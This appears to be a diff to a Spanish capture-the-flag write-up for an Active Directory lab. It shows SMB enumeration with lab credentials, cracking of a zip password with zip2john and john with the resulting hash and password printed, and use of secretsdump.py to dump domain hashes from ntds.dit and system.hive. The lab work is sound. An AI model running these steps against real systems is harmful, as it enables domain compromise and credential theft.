@@ -340,7 +340,7 @@ smbmap  -H 10.130.190.151 -u 'sbradley' -p 'Sisisi123'
 	trash                                             	READ ONLY	Files Pending for deletion
 
 Ahora si que tengo acceso la share trash, me meto y descargo los 3 archivos que encuentro.
-Esta otra vez la flag de sbradley, un .zip y un txt que me indica que en el .zip hay hashes dumpeados por Zerologon.
+Esta otra vez la flag de sbradley, un .zip y un txt que me indica que en el .zip hay hives.
 
 El .zip pide contraseña, asique lo paso por zip2john y lo crackeo.
  unzip experiment_gone_wrong.zip 
@@ -356,4 +356,20 @@ If that is not the case, the hash may be uncrackable. To avoid this, use
 option -o to pick a file at a time.
 
 cat /home/mksk/snap/john-the-ripper/694/.john/john.pot
-$pkzip$2*1*1*0*8*24*5873*0aca701e8077fc71fdf3a651de93e9b7b37ed5d4d48cec36ca963b52725f64627720ff63*2*0*2ce32b*f87000*bdcca7e2*0*45*8*2ce32b*591c*814528b2d2873ca5ff944f13e6ec1f8c5544aee691fe97d65403f319e744ecc9722c2d47230583558ac307a93d21473c5b38d3f73e56a35ce3e473aa9bd4fd97f249abeedac3ce349c0798809c80fc764944607c79ebff0f19bf637a557262b8dbda9e7f60e05add20ff3c63482a32a1af83ac71df200ea9461462bc725dc2c25fd95ff76a4d8a0991a2175e625bd195c7592a361d51553ad1621907afc18dd6571c130671ddadd53552ec1fa4ea9da878b21e9ecf8cee5b68ccafb370b20c62fd4ba63607f98d9e669f57602c40e2b612ff99ed63ff159fc9196002f9efe01478ee081bcd928b5143a2c80d5757f32c43483f41d3d584552901b55f394948b42c4c7106c70c48c70e02b76a35bb4664dd05f96ef5e55de735cfe60d10d711310b023e448c74cd7ca5ce80a892f2db2dd5bfab0a5486fb02259f234eda638c751772bcacd18bd923b9799ec79ae1d5e6c061858e5773edf3b9737e9b9bb1ac75635$SOURCE_HASH$c525b5ce08affaee87c1cb44c657f7fb:electromagnetismo
+//tercera flag. $pkzip$2*1*1*0*8*24*5873*0aca701e8077fc71fdf3a651de93e9b7b37ed5d4d48cec36ca963b52725f64627720ff63*2*0*2ce32b*f87000*bdcca7e2*0*45*8*2ce32b*591c*814528b2d2873ca5ff944f13e6ec1f8c5544aee691fe97d65403f319e744ecc9722c2d47230583558ac307a93d21473c5b38d3f73e56a35ce3e473aa9bd4fd97f249abeedac3ce349c0798809c80fc764944607c79ebff0f19bf637a557262b8dbda9e7f60e05add20ff3c63482a32a1af83ac71df200ea9461462bc725dc2c25fd95ff76a4d8a0991a2175e625bd195c7592a361d51553ad1621907afc18dd6571c130671ddadd53552ec1fa4ea9da878b21e9ecf8cee5b68ccafb370b20c62fd4ba63607f98d9e669f57602c40e2b612ff99ed63ff159fc9196002f9efe01478ee081bcd928b5143a2c80d5757f32c43483f41d3d584552901b55f394948b42c4c7106c70c48c70e02b76a35bb4664dd05f96ef5e55de735cfe60d10d711310b023e448c74cd7ca5ce80a892f2db2dd5bfab0a5486fb02259f234eda638c751772bcacd18bd923b9799ec79ae1d5e6c061858e5773edf3b9737e9b9bb1ac75635$SOURCE_HASH$c525b5ce08affaee87c1cb44c657f7fb:electromagnetismo
+
+
+Ya tengo la contraseña del .zip, lo descomprimo y veo dos archivos: 
+unzip experiment_gone_wrong.zip 
+Archive:  experiment_gone_wrong.zip
+[experiment_gone_wrong.zip] system.hive password: 
+  inflating: system.hive             
+  inflating: ntds.dit                
+
+Saco los hashes de los archivos y los guardo en domain_hashes.txt.
+python3 /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL > domain_hashes.txt
+Y ahora busco el hash del usuario administrador de AD, lvetrova.
+
+A primera vista no lo encuentro. Y con grep tampoco.
+Voy a probar por fuerza bruta.
+Le doy el archivo de hashes a deepseek y le digo que me saque solo los hashes ntlm. Y lo paso al archivo hashes.txt.
